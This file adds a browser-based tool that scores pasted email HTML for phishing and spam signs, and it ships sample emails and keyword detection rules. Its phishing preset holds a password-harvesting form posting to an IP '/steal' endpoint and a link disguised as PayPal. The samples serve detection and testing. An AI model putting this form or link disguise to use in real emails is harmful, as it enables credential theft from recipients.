@@ -1,0 +1,706 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Email Spam & Phishing Validator</title>
+  <!-- Tailwind CSS CDN -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          colors: {
+            brand: {
+              50: '#f0fdf4',
+              500: '#10b981',
+              600: '#059669',
+              900: '#064e3b',
+            }
+          }
+        }
+      }
+    }
+  </script>
+  <style>
+    /* Custom scrollbars for text areas and issue list */
+    ::-webkit-scrollbar { width: 6px; height: 6px; }
+    ::-webkit-scrollbar-track { background: #f1f5f9; }
+    ::-webkit-scrollbar-thumb { background: #cbd5e1; border-radius: 3px; }
+    ::-webkit-scrollbar-thumb:hover { background: #94a3b8; }
+  </style>
+</head>
+<body class="bg-slate-900 text-slate-100 min-h-screen flex flex-col font-sans antialiased">
+
+  <!-- Header -->
+  <header class="border-b border-slate-800 bg-slate-950/70 backdrop-blur sticky top-0 z-50">
+    <div class="max-w-7xl mx-auto px-4 sm:px-6 py-4 flex items-center justify-between">
+      <div class="flex items-center space-x-3">
+        <div class="h-10 w-10 rounded-xl bg-gradient-to-tr from-emerald-500 to-indigo-600 flex items-center justify-center shadow-lg shadow-emerald-500/20">
+          <svg class="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
+          </svg>
+        </div>
+        <div>
+          <h1 class="text-lg font-bold tracking-tight text-white flex items-center gap-2">
+            Email Spam Validator
+            <span class="text-xs font-medium px-2 py-0.5 rounded-full bg-emerald-500/20 text-emerald-300 border border-emerald-500/30">Client-Side Engine</span>
+          </h1>
+          <p class="text-xs text-slate-400">Native DOM parsing & heuristic heuristics analyzer</p>
+        </div>
+      </div>
+      <!-- Preset test buttons -->
+      <div class="hidden sm:flex items-center space-x-2 text-xs">
+        <span class="text-slate-400 font-medium mr-1">Load Preset:</span>
+        <button onclick="loadSample('phishing')" class="px-2.5 py-1.5 rounded-lg bg-rose-500/10 hover:bg-rose-500/20 text-rose-300 border border-rose-500/30 transition">Phishing</button>
+        <button onclick="loadSample('spam')" class="px-2.5 py-1.5 rounded-lg bg-amber-500/10 hover:bg-amber-500/20 text-amber-300 border border-amber-500/30 transition">Promo Spam</button>
+        <button onclick="loadSample('clean')" class="px-2.5 py-1.5 rounded-lg bg-emerald-500/10 hover:bg-emerald-500/20 text-emerald-300 border border-emerald-500/30 transition">Clean Email</button>
+      </div>
+    </div>
+  </header>
+
+  <!-- Main Content Layout -->
+  <main class="flex-1 max-w-7xl mx-auto w-full p-4 sm:p-6 grid grid-cols-1 lg:grid-cols-12 gap-6">
+
+    <!-- Left Column: Input (5 cols on lg) -->
+    <section class="lg:col-span-5 flex flex-col gap-4">
+      <div class="bg-slate-950 border border-slate-800 rounded-2xl p-4 flex-1 flex flex-col shadow-xl">
+        <div class="flex items-center justify-between pb-3 border-b border-slate-800">
+          <label for="emailHtml" class="text-sm font-semibold text-slate-200 flex items-center gap-2">
+            <svg class="w-4 h-4 text-emerald-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 20l4-16m4 4l4 4-4 4M6 16l-4-4 4-4" />
+            </svg>
+            Raw HTML Email Code
+          </label>
+          <div class="flex items-center gap-2">
+            <button onclick="clearInput()" class="text-xs text-slate-400 hover:text-slate-200 transition px-2 py-1">Clear</button>
+          </div>
+        </div>
+
+        <div class="relative flex-1 mt-3">
+          <textarea
+            id="emailHtml"
+            placeholder="Paste raw HTML email source here (e.g. <div>...</div>)..."
+            class="w-full h-80 lg:h-[460px] p-3 text-xs sm:text-sm font-mono bg-slate-900 text-slate-300 rounded-xl border border-slate-800 focus:border-emerald-500 focus:ring-1 focus:ring-emerald-500 outline-none resize-none placeholder-slate-600 transition"
+          ></textarea>
+        </div>
+
+        <div class="pt-4 mt-2">
+          <button
+            id="btnValidate"
+            onclick="validateEmailContent()"
+            class="w-full py-3 px-4 bg-gradient-to-r from-emerald-500 to-teal-600 hover:from-emerald-400 hover:to-teal-500 text-slate-950 font-bold rounded-xl shadow-lg shadow-emerald-500/20 active:scale-[0.99] transition duration-150 flex items-center justify-center gap-2"
+          >
+            <svg class="w-5 h-5 text-slate-950" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2m-6 9l2 2 4-4" />
+            </svg>
+            Validate Content
+          </button>
+        </div>
+      </div>
+    </section>
+
+    <!-- Right Column: Output Panel (7 cols on lg) -->
+    <section class="lg:col-span-7 flex flex-col gap-4">
+      
+      <!-- Welcome Empty State (Visible before validation) -->
+      <div id="emptyState" class="bg-slate-950 border border-slate-800 rounded-2xl p-12 text-center flex flex-col items-center justify-center flex-1 min-h-[400px]">
+        <div class="h-16 w-16 bg-slate-900 border border-slate-800 rounded-2xl flex items-center justify-center text-slate-500 mb-4">
+          <svg class="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M19 11H5m14 0a2 2 0 012 2v6a2 2 0 01-2 2H5a2 2 0 01-2-2v-6a2 2 0 012-2m14 0V9a2 2 0 00-2-2M5 11V9a2 2 0 012-2m0 0V5a2 2 0 012-2h6a2 2 0 012 2v2M7 7h10" />
+          </svg>
+        </div>
+        <h3 class="text-base font-semibold text-slate-300">Awaiting HTML Input</h3>
+        <p class="text-xs text-slate-500 max-w-sm mt-1">Paste your raw email template on the left and click "Validate Content" to inspect hidden text, deceptive links, and spam phrases.</p>
+      </div>
+
+      <!-- Results Panel (Hidden until analyzed) -->
+      <div id="resultsPanel" class="hidden flex-col gap-4">
+        
+        <!-- Score Card Header -->
+        <div class="bg-slate-950 border border-slate-800 rounded-2xl p-5 shadow-xl">
+          <div class="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4">
+            <div class="flex items-center gap-4">
+              <!-- Radial/Score percentage display -->
+              <div id="scoreCircle" class="relative w-20 h-20 rounded-2xl flex flex-col items-center justify-center font-black transition-colors duration-300 border">
+                <span id="scoreNumber" class="text-2xl leading-none font-extrabold tracking-tight">0%</span>
+                <span class="text-[9px] uppercase tracking-wider font-semibold opacity-75 mt-0.5">Spam</span>
+              </div>
+              <div>
+                <div class="flex items-center gap-2">
+                  <span id="riskBadge" class="text-xs font-bold uppercase tracking-wider px-3 py-1 rounded-full border">
+                    Clean
+                  </span>
+                  <span id="issueCountBadge" class="text-xs text-slate-400 font-medium">0 issues detected</span>
+                </div>
+                <h2 id="verdictTitle" class="text-base font-bold text-slate-100 mt-1">Email is safe and legitimate</h2>
+                <p id="verdictSubtitle" class="text-xs text-slate-400 mt-0.5">No critical spam techniques or deceptive content detected.</p>
+              </div>
+            </div>
+
+            <!-- Mini stats bar -->
+            <div class="grid grid-cols-3 gap-2 w-full sm:w-auto text-center border-t sm:border-t-0 sm:border-l border-slate-800 pt-3 sm:pt-0 sm:pl-4">
+              <div class="bg-slate-900/80 px-3 py-2 rounded-xl border border-slate-800">
+                <div class="text-[10px] text-slate-400 uppercase font-medium">Hidden</div>
+                <div id="statHidden" class="text-sm font-bold text-slate-200">0</div>
+              </div>
+              <div class="bg-slate-900/80 px-3 py-2 rounded-xl border border-slate-800">
+                <div class="text-[10px] text-slate-400 uppercase font-medium">Links</div>
+                <div id="statLinks" class="text-sm font-bold text-slate-200">0</div>
+              </div>
+              <div class="bg-slate-900/80 px-3 py-2 rounded-xl border border-slate-800">
+                <div class="text-[10px] text-slate-400 uppercase font-medium">Keywords</div>
+                <div id="statKeywords" class="text-sm font-bold text-slate-200">0</div>
+              </div>
+            </div>
+          </div>
+
+          <!-- Progress Bar -->
+          <div class="mt-4 pt-3 border-t border-slate-900">
+            <div class="flex justify-between text-[11px] font-medium text-slate-400 mb-1">
+              <span>Clean (0%)</span>
+              <span>Suspicious (35%)</span>
+              <span>Dangerous (70%+)</span>
+            </div>
+            <div class="w-full h-2 rounded-full bg-slate-900 overflow-hidden">
+              <div id="progressBar" class="h-full rounded-full transition-all duration-500 ease-out" style="width: 0%"></div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Detected Issues Breakdown -->
+        <div class="bg-slate-950 border border-slate-800 rounded-2xl p-5 shadow-xl flex-1 flex flex-col">
+          <div class="flex items-center justify-between pb-3 border-b border-slate-800">
+            <h3 class="text-sm font-bold text-slate-200 flex items-center gap-2">
+              <svg class="w-4 h-4 text-emerald-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
+              </svg>
+              Score Breakdown & Diagnostics
+            </h3>
+            <span id="diagnosticSummary" class="text-xs text-slate-400"></span>
+          </div>
+
+          <!-- List of issues -->
+          <div id="issuesContainer" class="mt-3 space-y-2.5 overflow-y-auto max-h-[380px] pr-1">
+            <!-- Dynamically populated via JS -->
+          </div>
+        </div>
+
+      </div>
+
+    </section>
+  </main>
+
+  <!-- JavaScript Validation Logic -->
+  <script>
+    // Spam keywords & patterns mapped with threat weights
+    const SPAM_KEYWORD_RULES = [
+      { regex: /\b(free money|claim prize|claim your prize|won a prize)\b/gi, weight: 25, label: "Prize Scam Language", desc: "Explicit prize/cash lure keywords detected." },
+      { regex: /\b(urgent click|click here immediately|act now or lose|account suspended|verify your account)\b/gi, weight: 22, label: "False Urgency / Coercion", desc: "Aggressive call-to-action attempting to force immediate interaction." },
+      { regex: /\b(100% free|risk-free|double your bitcoin|crypto windfall|wire transfer|unclaimed inheritance|nigerian prince)\b/gi, weight: 25, label: "Financial / Crypto Bait", desc: "Common financial fraud and unrealistic return phrases." },
+      { regex: /\b(congratulations you won|you have been selected|winner!)\b/gi, weight: 18, label: "Lottery / Selection Deception", desc: "Fake winner declaration commonly used in phishing campaigns." },
+      { regex: /\b(viagra|cialis|weight loss miracle|casino jackpot)\b/gi, weight: 25, label: "High-Volume Blacklisted Niche", desc: "Pharmaceutical or illicit gaming spam triggers." },
+      { regex: /\b(dear beneficiary|beneficiary funds|next of kin)\b/gi, weight: 28, label: "Advance-Fee Fraud Pattern", desc: "Typical 419 advance-fee fraud terminology." }
+    ];
+
+    const URL_SHORTENERS = [
+      'bit.ly', 'tinyurl.com', 'cutt.ly', 'is.gd', 't.co', 'ow.ly', 'buff.ly', 'adf.ly', 'goo.gl', 'shorte.st'
+    ];
+
+    /**
+     * Clear the editor textarea
+     */
+    function clearInput() {
+      document.getElementById('emailHtml').value = '';
+      document.getElementById('resultsPanel').classList.add('hidden');
+      document.getElementById('emptyState').classList.remove('hidden');
+    }
+
+    /**
+     * Preset sample loaders
+     */
+    function loadSample(type) {
+      const textarea = document.getElementById('emailHtml');
+      if (type === 'phishing') {
+        textarea.value = `<!DOCTYPE html>
+<html>
+<head>
+  <style>
+    .hidden-preview { display: none; font-size: 0px; }
+  </style>
+</head>
+<body style="font-family: sans-serif; color: #111;">
+  <span class="hidden-preview" style="color: transparent; opacity: 0;">
+    Verify your identity to prevent immediate suspension of account assets!
+  </span>
+  <div style="background-color: #f8fafc; padding: 24px; border: 1px solid #e2e8f0;">
+    <h2 style="color: #dc2626;">SECURITY ALERT: VERIFY YOUR ACCOUNT IMMEDIATELY!</h2>
+    <p>Dear customer, your bank account access will be terminated within 24 hours.</p>
+    
+    <!-- Link disguise: text says paypal.com but points to raw IP -->
+    <p>
+      Visit our secure portal: 
+      <a href="http://192.168.1.104/secure-login/login.php">https://www.paypal.com/security-verify</a>
+    </p>
+
+    <!-- Forbidden credential collection inside email -->
+    <form action="http://45.33.32.156/steal" method="POST">
+      <label>Enter Master Password: </label>
+      <input type="password" name="pwd" placeholder="Enter password" />
+      <button type="submit">Unlock Now</button>
+    </form>
+    
+    <div style="font-size: 1px; color: #fff; height: 0px; overflow: hidden;">
+      Random hidden text hash: a9f83c0192830192830129381023
+    </div>
+  </div>
+</body>
+</html>`;
+      } else if (type === 'spam') {
+        textarea.value = `<!DOCTYPE html>
+<html>
+<body>
+  <div style="background: #fff; padding: 20px;">
+    <h1 style="color: red;">CONGRATULATIONS YOU WON FREE MONEY RIGHT NOW!!!</h1>
+    <p>ACT NOW TO CLAIM PRIZE! YOU ARE 100% GUARANTEED WINNER OF $50,000 CASH!</p>
+    
+    <!-- URL Shortener used to obscure destination -->
+    <p>Click here to collect: <a href="https://bit.ly/claim-your-jackpot">https://bit.ly/claim-your-jackpot</a></p>
+
+    <!-- Hidden text to manipulate spam filters -->
+    <div style="display: none;">
+      weather report sun clouds apple banana normal words to fool scanner algorithms
+    </div>
+    
+    <p>RISK-FREE CRYPTO WINDFALL AWAITS. ACT NOW OR LOSE EVERYTHING!</p>
+  </div>
+</body>
+</html>`;
+      } else {
+        textarea.value = `<!DOCTYPE html>
+<html lang="en">
+<body style="font-family: Arial, sans-serif; background-color: #f4f6f8; margin: 0; padding: 20px;">
+  <table width="600" align="center" style="background-color: #ffffff; border-radius: 8px; padding: 30px; box-shadow: 0 2px 4px rgba(0,0,0,0.1);">
+    <tr>
+      <td>
+        <h2 style="color: #1e293b; margin-top: 0;">Your Monthly Product Digest</h2>
+        <p style="color: #475569; line-height: 1.6;">
+          Hello Jordan, here is your summary of platform activities for October. We shipped new productivity features and streamlined your dashboard.
+        </p>
+        <div style="margin: 25px 0;">
+          <a href="https://acme-analytics.com/reports/october" style="background-color: #2563eb; color: #ffffff; text-decoration: none; padding: 12px 24px; border-radius: 6px; font-weight: bold; display: inline-block;">
+            View Detailed Report
+          </a>
+        </div>
+        <hr style="border: 0; border-top: 1px solid #e2e8f0; margin: 30px 0;" />
+        <p style="color: #94a3b8; font-size: 12px; margin-bottom: 0;">
+          You received this email because you subscribed to Acme updates. 
+          <a href="https://acme-analytics.com/unsubscribe" style="color: #64748b;">Unsubscribe</a> anytime.
+        </p>
+      </td>
+    </tr>
+  </table>
+</body>
+</html>`;
+      }
+      validateEmailContent();
+    }
+
+    /**
+     * Main validation logic using DOMParser
+     */
+    function validateEmailContent() {
+      const rawHtml = document.getElementById('emailHtml').value.trim();
+      if (!rawHtml) {
+        alert("Please paste some HTML content first or select one of the presets.");
+        return;
+      }
+
+      // 1. Native DOMParser invocation
+      const parser = new DOMParser();
+      const doc = parser.parseFromString(rawHtml, 'text/html');
+
+      // Containers for detected issues
+      let issues = [];
+      let totalScore = 0;
+      let hiddenElementsCount = 0;
+      let suspiciousLinksCount = 0;
+      let keywordsDetectedCount = 0;
+
+      // ============================================
+      // Check 1: Script tags or Iframes (Severe Security Risk)
+      // ============================================
+      const scripts = doc.querySelectorAll('script');
+      if (scripts.length > 0) {
+        issues.push({
+          type: 'danger',
+          category: 'Active Scripting',
+          title: `<script> Tag Detected (${scripts.length})`,
+          detail: 'Email clients block JavaScript. Inclusion of executable script is almost universally indicative of malware/exploit.',
+          snippet: scripts[0].outerHTML.slice(0, 100),
+          points: 35
+        });
+        totalScore += 35;
+      }
+
+      const iframes = doc.querySelectorAll('iframe');
+      if (iframes.length > 0) {
+        issues.push({
+          type: 'danger',
+          category: 'Embedded Frames',
+          title: `Embedded <iframe> Element Detected`,
+          detail: 'Iframes in emails are malicious injection vectors to display external phishing payloads.',
+          snippet: iframes[0].outerHTML.slice(0, 100),
+          points: 30
+        });
+        totalScore += 30;
+      }
+
+      // ============================================
+      // Check 2: Forms & Password Inputs inside Email
+      // ============================================
+      const passwords = doc.querySelectorAll('input[type="password"]');
+      if (passwords.length > 0) {
+        issues.push({
+          type: 'danger',
+          category: 'Phishing Credential Harvester',
+          title: 'Direct Password Input Field Found',
+          detail: 'Legitimate emails never request passwords directly inside an embedded input.',
+          snippet: passwords[0].outerHTML,
+          points: 40
+        });
+        totalScore += 40;
+      }
+
+      const forms = doc.querySelectorAll('form');
+      if (forms.length > 0 && passwords.length === 0) {
+        issues.push({
+          type: 'warning',
+          category: 'Interactive Form',
+          title: 'Embedded <form> Submission',
+          detail: 'Forms in emails are high-risk indicators often flagged or disabled by modern mail clients.',
+          snippet: forms[0].outerHTML.slice(0, 120),
+          points: 18
+        });
+        totalScore += 18;
+      }
+
+      // ============================================
+      // Check 3: Hidden Text & Obfuscation Techniques
+      // ============================================
+      const allElements = doc.querySelectorAll('*');
+      allElements.forEach(el => {
+        const style = (el.getAttribute('style') || '').toLowerCase();
+        const hasHiddenAttr = el.hasAttribute('hidden');
+
+        const isDisplayNone = /display\s*:\s*none/.test(style);
+        const isVisibilityHidden = /visibility\s*:\s*hidden/.test(style);
+        const isOpacityZero = /opacity\s*:\s*0(\.0+)?(?![0-9])/.test(style);
+        const isFontSizeZero = /font-size\s*:\s*(0px|0pt|0em|0)/.test(style);
+        const isTinyText = /font-size\s*:\s*1px/.test(style);
+        const isOffscreen = /text-indent\s*:\s*-[0-9]{3,}px/.test(style) || /left\s*:\s*-[0-9]{4,}px/.test(style);
+        const isZeroHeight = /height\s*:\s*0(px)?/.test(style) && /overflow\s*:\s*hidden/.test(style);
+        const isTransparent = /color\s*:\s*(transparent|rgba?\([^)]+,0\))/.test(style);
+
+        if (hasHiddenAttr || isDisplayNone || isVisibilityHidden || isOpacityZero || isFontSizeZero || isTinyText || isOffscreen || isZeroHeight || isTransparent) {
+          hiddenElementsCount++;
+          if (hiddenElementsCount <= 3) {
+            let reason = isDisplayNone ? 'display: none' :
+                         isVisibilityHidden ? 'visibility: hidden' :
+                         isOpacityZero ? 'opacity: 0' :
+                         (isFontSizeZero || isTinyText) ? 'Zero/Tiny font-size (0-1px)' :
+                         isTransparent ? 'Transparent text color' : 'Off-screen CSS positioning';
+            issues.push({
+              type: 'warning',
+              category: 'Hidden Content',
+              title: `Stealth Text / Styling Obfuscation`,
+              detail: `Hidden styling detected (${reason}). Spammers hide keyword-stuffing text to game Bayesian filters.`,
+              snippet: el.outerHTML.slice(0, 120),
+              points: 15
+            });
+            totalScore += 15;
+          }
+        }
+      });
+
+      // ============================================
+      // Check 4: Suspicious Links & Spoofed Domains
+      // ============================================
+      const links = doc.querySelectorAll('a');
+      links.forEach(a => {
+        const href = (a.getAttribute('href') || '').trim();
+        const text = a.textContent.trim();
+
+        if (!href) return;
+
+        // Check for raw IP address in href
+        const ipRegex = /^https?:\/\/(\d{1,3}\.){3}\d{1,3}/i;
+        if (ipRegex.test(href)) {
+          suspiciousLinksCount++;
+          issues.push({
+            type: 'danger',
+            category: 'Suspicious URL',
+            title: 'Raw IP Address in Hyperlink',
+            detail: `Link points to a numeric IP (${href}) rather than an authenticated domain name. Typical of disposable phishing servers.`,
+            snippet: a.outerHTML.slice(0, 120),
+            points: 25
+          });
+          totalScore += 25;
+        }
+
+        // Check for URL Shorteners
+        const isShortener = URL_SHORTENERS.some(domain => href.toLowerCase().includes(domain));
+        if (isShortener) {
+          suspiciousLinksCount++;
+          issues.push({
+            type: 'warning',
+            category: 'Obfuscated Link',
+            title: 'URL Shortener Detected',
+            detail: `Shortener discovered (${href}). Shorteners obscure the true destination from the recipient.`,
+            snippet: a.outerHTML.slice(0, 120),
+            points: 15
+          });
+          totalScore += 15;
+        }
+
+        // Check for Link Text Discrepancy (Classic Phishing Spoof)
+        // e.g. text says "https://paypal.com" but href points to evil-site.com
+        const urlInTextMatch = text.match(/(https?:\/\/)?([a-zA-Z0-9-]+\.[a-zA-Z]{2,})/i);
+        if (urlInTextMatch) {
+          const displayDomain = urlInTextMatch[2].toLowerCase();
+          try {
+            const actualUrl = new URL(href.startsWith('http') ? href : `http://${href}`);
+            const actualDomain = actualUrl.hostname.toLowerCase();
+
+            if (!actualDomain.includes(displayDomain) && !displayDomain.includes(actualDomain)) {
+              suspiciousLinksCount++;
+              issues.push({
+                type: 'danger',
+                category: 'Domain Mismatch',
+                title: 'Deceptive / Spoofed Hyperlink',
+                detail: `Link text shows "${displayDomain}" but actually routes to "${actualDomain}". This is a primary phishing tactic.`,
+                snippet: `<a href="${href}">${text}</a>`,
+                points: 35
+              });
+              totalScore += 35;
+            }
+          } catch (e) {
+            // Malformed URL
+          }
+        }
+
+        // Check for suspicious javascript: / data: hrefs
+        if (href.toLowerCase().startsWith('javascript:') || href.toLowerCase().startsWith('data:text/html')) {
+          suspiciousLinksCount++;
+          issues.push({
+            type: 'danger',
+            category: 'Payload URI',
+            title: 'Dangerous Protocol in Link',
+            detail: 'Link uses javascript: or data: pseudo-protocol to execute client code upon clicking.',
+            snippet: a.outerHTML.slice(0, 100),
+            points: 30
+          });
+          totalScore += 30;
+        }
+      });
+
+      // ============================================
+      // Check 5: Spam Keywords & Trigger Words
+      // ============================================
+      const bodyText = (doc.body ? (doc.body.innerText || doc.body.textContent) : '') || '';
+
+      SPAM_KEYWORD_RULES.forEach(rule => {
+        const matches = bodyText.match(rule.regex);
+        if (matches) {
+          const count = matches.length;
+          keywordsDetectedCount += count;
+          issues.push({
+            type: 'warning',
+            category: rule.label,
+            title: `Detected "${matches[0]}" (${count}x)`,
+            detail: rule.desc,
+            snippet: `Found in text: "...${matches[0]}..."`,
+            points: Math.min(rule.weight + (count > 1 ? 5 : 0), 30)
+          });
+          totalScore += rule.weight;
+        }
+      });
+
+      // ============================================
+      // Check 6: Excessive Uppercase & Screaming Text
+      // ============================================
+      const cleanText = bodyText.replace(/[^a-zA-Z]/g, '');
+      if (cleanText.length > 40) {
+        const uppercaseCount = (bodyText.match(/[A-Z]/g) || []).length;
+        const upperRatio = uppercaseCount / cleanText.length;
+
+        if (upperRatio > 0.45) {
+          issues.push({
+            type: 'warning',
+            category: 'Content Formatting',
+            title: 'Excessive Capitalization (SHOUTING)',
+            detail: `${Math.round(upperRatio * 100)}% of characters are UPPERCASE. Legitimate correspondence rarely exceeds 15-20%.`,
+            snippet: bodyText.slice(0, 90) + '...',
+            points: 15
+          });
+          totalScore += 15;
+        }
+      }
+
+      // Multiple exclamation marks
+      if (/[!]{3,}/.test(bodyText) || (bodyText.match(/!/g) || []).length > 6) {
+        issues.push({
+          type: 'info',
+          category: 'Typography Punctuation',
+          title: 'Excessive Exclamation Marks (!!!)',
+          detail: 'Repeated exclamation punctuation triggers aggressive spam filter scrutiny.',
+          snippet: 'Multiple consecutive exclamation symbols found in body.',
+          points: 8
+        });
+        totalScore += 8;
+      }
+
+      // ============================================
+      // Clamp Score between 0% and 100%
+      // ============================================
+      const finalScore = Math.min(Math.max(totalScore, 0), 100);
+
+      // Render the results
+      renderResults({
+        score: finalScore,
+        issues: issues,
+        hiddenCount: hiddenElementsCount,
+        linksCount: suspiciousLinksCount,
+        keywordsCount: keywordsDetectedCount
+      });
+    }
+
+    /**
+     * Render results to the right panel
+     */
+    function renderResults(data) {
+      document.getElementById('emptyState').classList.add('hidden');
+      const resultsPanel = document.getElementById('resultsPanel');
+      resultsPanel.classList.remove('hidden');
+
+      // Update Quick Stats
+      document.getElementById('statHidden').innerText = data.hiddenCount;
+      document.getElementById('statLinks').innerText = data.linksCount;
+      document.getElementById('statKeywords').innerText = data.keywordsCount;
+      document.getElementById('issueCountBadge').innerText = `${data.issues.length} flagged indicators`;
+
+      // Gauge / Score Elements
+      const scoreCircle = document.getElementById('scoreCircle');
+      const scoreNumber = document.getElementById('scoreNumber');
+      const riskBadge = document.getElementById('riskBadge');
+      const verdictTitle = document.getElementById('verdictTitle');
+      const verdictSubtitle = document.getElementById('verdictSubtitle');
+      const progressBar = document.getElementById('progressBar');
+
+      scoreNumber.innerText = `${data.score}%`;
+      progressBar.style.width = `${data.score}%`;
+
+      // Clear previous theme classes
+      scoreCircle.className = "relative w-20 h-20 rounded-2xl flex flex-col items-center justify-center font-black transition-colors duration-300 border ";
+      riskBadge.className = "text-xs font-bold uppercase tracking-wider px-3 py-1 rounded-full border ";
+      progressBar.className = "h-full rounded-full transition-all duration-500 ease-out ";
+
+      if (data.score <= 25) {
+        // GREEN / CLEAN
+        scoreCircle.classList.add('bg-emerald-950/60', 'text-emerald-400', 'border-emerald-500/40', 'shadow-lg', 'shadow-emerald-900/30');
+        riskBadge.classList.add('bg-emerald-500/20', 'text-emerald-300', 'border-emerald-500/40');
+        riskBadge.innerText = 'Low Risk / Clean';
+        verdictTitle.innerText = 'Clean Email Signature';
+        verdictTitle.className = "text-base font-bold text-emerald-300 mt-1";
+        verdictSubtitle.innerText = 'Email adheres to typical deliverability guidelines and shows no severe deceptive tactics.';
+        progressBar.classList.add('bg-emerald-500');
+      } else if (data.score <= 65) {
+        // YELLOW / AMBER / MODERATE
+        scoreCircle.classList.add('bg-amber-950/60', 'text-amber-400', 'border-amber-500/40', 'shadow-lg', 'shadow-amber-900/30');
+        riskBadge.classList.add('bg-amber-500/20', 'text-amber-300', 'border-amber-500/40');
+        riskBadge.innerText = 'Moderate / Suspicious';
+        verdictTitle.innerText = 'Promotional / Suspicious Pattern';
+        verdictTitle.className = "text-base font-bold text-amber-300 mt-1";
+        verdictSubtitle.innerText = 'Contains aggressive marketing patterns, hidden styles, or link shorteners that may trigger inbox spam folders.';
+        progressBar.classList.add('bg-amber-500');
+      } else {
+        // RED / HIGH RISK
+        scoreCircle.classList.add('bg-rose-950/60', 'text-rose-400', 'border-rose-500/40', 'shadow-lg', 'shadow-rose-900/30');
+        riskBadge.classList.add('bg-rose-500/20', 'text-rose-300', 'border-rose-500/40');
+        riskBadge.innerText = 'High Risk Phishing / Spam';
+        verdictTitle.innerText = 'Critical Threat Vector Detected';
+        verdictTitle.className = "text-base font-bold text-rose-400 mt-1";
+        verdictSubtitle.innerText = 'Severe red flags detected including mismatched destination URLs, hidden traps, or credential requests.';
+        progressBar.classList.add('bg-rose-500');
+      }
+
+      // Populate Diagnostic Issues List
+      const issuesContainer = document.getElementById('issuesContainer');
+      const diagnosticSummary = document.getElementById('diagnosticSummary');
+      diagnosticSummary.innerText = data.issues.length ? `Showing ${data.issues.length} item(s)` : 'All checks passed';
+      issuesContainer.innerHTML = '';
+
+      if (data.issues.length === 0) {
+        issuesContainer.innerHTML = `
+          <div class="p-6 text-center border border-dashed border-slate-800 rounded-xl bg-slate-900/40">
+            <svg class="w-8 h-8 mx-auto text-emerald-400 mb-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7" />
+            </svg>
+            <p class="text-sm font-semibold text-slate-300">Zero Spam Indicators Found</p>
+            <p class="text-xs text-slate-500 mt-1">No hidden styling, spoofed links, credential inputs, or blacklisted trigger phrases.</p>
+          </div>
+        `;
+        return;
+      }
+
+      data.issues.forEach(issue => {
+        let borderClass = 'border-amber-500/30 bg-amber-950/10';
+        let badgeClass = 'bg-amber-500/20 text-amber-300 border-amber-500/30';
+        let textTitle = 'text-amber-200';
+
+        if (issue.type === 'danger') {
+          borderClass = 'border-rose-500/40 bg-rose-950/15';
+          badgeClass = 'bg-rose-500/20 text-rose-300 border-rose-500/40';
+          textTitle = 'text-rose-300';
+        } else if (issue.type === 'info') {
+          borderClass = 'border-slate-700 bg-slate-900/40';
+          badgeClass = 'bg-slate-800 text-slate-300 border-slate-700';
+          textTitle = 'text-slate-200';
+        }
+
+        const item = document.createElement('div');
+        item.className = `p-3.5 rounded-xl border ${borderClass} transition flex flex-col gap-2`;
+        item.innerHTML = `
+          <div class="flex items-center justify-between gap-2">
+            <div class="flex items-center gap-2">
+              <span class="text-[10px] font-bold uppercase tracking-wider px-2 py-0.5 rounded border ${badgeClass}">
+                ${escapeHtml(issue.category)}
+              </span>
+              <h4 class="text-xs font-bold ${textTitle}">${escapeHtml(issue.title)}</h4>
+            </div>
+            <span class="text-[11px] font-mono font-semibold text-slate-400">+${issue.points}%</span>
+          </div>
+          <p class="text-xs text-slate-400 leading-relaxed">${escapeHtml(issue.detail)}</p>
+          ${issue.snippet ? `
+            <div class="bg-slate-950 p-2 rounded-lg border border-slate-800/80 font-mono text-[11px] text-slate-300 overflow-x-auto whitespace-pre">
+              <code>${escapeHtml(issue.snippet)}</code>
+            </div>
+          ` : ''}
+        `;
+        issuesContainer.appendChild(item);
+      });
+    }
+
+    // Utility: XSS prevention helper for DOM output
+    function escapeHtml(str) {
+      if (!str) return '';
+      return String(str)
+        .replace(/&/g, '&amp;')
+        .replace(/</g, '&lt;')
+        .replace(/>/g, '&gt;')
+        .replace(/"/g, '&quot;')
+        .replace(/'/g, '&#039;');
+    }
+  </script>
+</body>
+</html>
